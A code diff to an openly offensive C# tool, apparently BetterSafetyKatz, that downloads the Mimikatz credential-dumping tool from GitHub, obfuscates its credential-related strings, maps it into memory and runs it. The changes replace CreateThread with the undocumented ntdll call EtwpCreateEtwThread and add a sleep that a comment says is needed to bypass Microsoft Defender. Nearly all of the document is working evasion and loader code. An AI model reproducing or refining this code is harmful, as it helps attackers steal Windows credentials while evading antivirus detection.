@@ -66,7 +66,7 @@ namespace BetterSafetyKatz
                 var latestUrl = rgx.Matches(latestReleases)[0].ToString();
 
 
-                Console.WriteLine("[+] Contacting gentilkiwi -> " + latestUrl);
+                Console.WriteLine("[+] Contacting gentilkiwi -> " + latestUrl.Split(new string[] { "download/" }, StringSplitOptions.None)[1]);
 
                 //Download that
                 var zipStream = webClient.DownloadData(latestUrl);
@@ -102,7 +102,7 @@ namespace BetterSafetyKatz
                   "logonPasswords",
                   "credman",
             };
-                
+
                 //In-code strings that we can give random names
                 var stringsToRandomlyObfuscate = new string[] {
                 "SamQueryInformationUser",
@@ -301,17 +301,15 @@ namespace BetterSafetyKatz
                 }
 
                 Console.WriteLine("[+] Executing loaded Mimikatz PE");
-
                 IntPtr threadStart = (IntPtr)((long)(codebase.ToInt64() + (int)pe.OptionalHeader64.AddressOfEntryPoint));
 
-
+                //This is needed for bypass , ¯\_(ツ)_/¯ Defender is weird
                 Thread.Sleep(2000);
 
-
-                IntPtr hThread = WINLib.CreateThread(IntPtr.Zero, 0, threadStart, "coffee", 0, IntPtr.Zero);
+                IntPtr hThread = WINLib.EtwpCreateEtwThread(threadStart, IntPtr.Zero);
 
                 //Change to create-thread
-                WINLib.WaitForSingleObject(hThread, 500000);
+                WINLib.WaitForSingleObject(hThread, WINLib.INFINITE);
 
             }
         }
@@ -319,38 +317,42 @@ namespace BetterSafetyKatz
 
     unsafe class WINLib
     {
-
+        //Values we need
         public static uint MEM_COMMIT = 0x1000;
         public static uint MEM_RESERVE = 0x2000;
         public static uint PAGE_EXECUTE_READWRITE = 0x40;
         public static uint PAGE_READWRITE = 0x04;
+        public static uint INFINITE = 0xffffffff;
 
-        [StructLayout(LayoutKind.Sequential)]
-        public unsafe struct IMAGE_BASE_RELOCATION
-        {
-            public uint VirtualAdress;
-            public uint SizeOfBlock;
-        }
+
+        //Imports from system dlls
+        //Found by TheWover
+        //https://gist.github.com/TheWover/b2b2e427d3a81659942f4e8b9a978dc3
+
+        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
+        public static extern IntPtr EtwpCreateEtwThread(
+            IntPtr lpStartAddress,
+            IntPtr lpParameter
+            );
 
         [DllImport("kernel32")]
-        public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);
+        public static extern IntPtr VirtualAlloc(
+            IntPtr lpStartAddr,
+            uint size,
+            uint flAllocationType,
+            uint flProtect
+            );
 
         [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-        public static extern IntPtr LoadLibrary(string lpFileName);
+        public static extern IntPtr LoadLibrary(
+            string lpFileName
+            );
 
         [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
-        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-        [DllImport("kernel32")]
-        public static extern IntPtr CreateThread(
-
-          IntPtr lpThreadAttributes,
-          uint dwStackSize,
-          IntPtr lpStartAddress,
-          string param,
-          uint dwCreationFlags,
-          IntPtr lpThreadId
-          );
+        public static extern IntPtr GetProcAddress(
+            IntPtr hModule,
+            string procName
+            );
 
         [DllImport("kernel32")]
         public static extern UInt32 WaitForSingleObject(
@@ -358,6 +360,15 @@ namespace BetterSafetyKatz
           IntPtr hHandle,
           UInt32 dwMilliseconds
           );
+
+        //Structs
+        [StructLayout(LayoutKind.Sequential)]
+        public unsafe struct IMAGE_BASE_RELOCATION
+        {
+            public uint VirtualAdress;
+            public uint SizeOfBlock;
+        }
+
 
         [StructLayout(LayoutKind.Sequential)]
         public unsafe struct IMAGE_IMPORT_DESCRIPTOR
